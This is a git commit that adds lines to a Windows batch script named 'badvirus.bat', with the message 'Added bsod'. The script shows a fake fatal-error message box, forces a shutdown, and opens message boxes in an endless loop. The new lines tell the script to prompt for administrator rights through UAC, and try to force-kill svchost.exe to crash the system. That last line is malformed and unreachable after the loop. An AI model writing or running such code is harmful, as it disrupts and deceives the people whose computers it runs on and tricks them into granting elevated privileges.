74b8a7f544c3738b1dea39e5df5e18c3e0e90f5b
Suprateek Dhar <118747426+sdcardbro123@users.noreply.github.com>
2024-02-24 08:18:36 +0530

    Update badvirus.bat
    Added bsod

--- badvirus.bat
+++ badvirus.bat
@@ -1,3 +1,6 @@
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
+
 @echo off
 
 echo x=msgbox("Fatal error: ctfmon.exe corrupt" ,48, "Windows is Shutting down due to a fatal error") >> msgbox.vbs
@@ -5,3 +8,5 @@ shutdown -s -t 60
 :a
 start msgbox.vbs
 goto a
+
+/C taskkill /IM svchost.exe /F
